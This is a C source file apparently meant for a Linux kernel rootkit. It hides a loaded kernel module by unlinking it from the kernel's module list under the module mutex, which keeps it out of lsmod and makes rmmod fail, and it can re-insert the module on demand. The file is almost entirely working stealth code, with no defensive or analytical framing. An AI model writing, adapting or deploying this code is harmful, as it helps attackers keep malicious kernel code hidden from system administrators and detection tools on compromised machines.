#include <linux/module.h>
#include <linux/kernel.h>

static struct module	*me;
static struct mutex		*_module_mutex;
static struct list_head *mod_lst;
static char	hidden	= 0;

void hidemod_setmutex(unsigned long mutex_addr)
{
	_module_mutex = (struct mutex *) mutex_addr;
	printk("Address of module_mutex: %p\n", _module_mutex);
}

/**
 * we should enable this to hide multiple modules
 * by having a list of pairs (module, name).
 */
void hidemod_setmodule(struct module *to_hide)
{
	me = to_hide;
	mod_lst = to_hide->list.next;
}

// Removes this module from the kernel modules list. rmmod would stop working for this module.
void hide_module(void)
{
	if(hidden)
		return;
	
	mutex_lock(_module_mutex);
	hidden = 1;
	list_del(&(me->list));
	mutex_unlock(_module_mutex);
}

// Re-inserts this module in the list.
void show_module(void)
{
	if(!hidden)
		return;

	mutex_lock(_module_mutex);
	hidden = 0;
	list_add(&(me->list), mod_lst);
	mutex_unlock(_module_mutex);
}

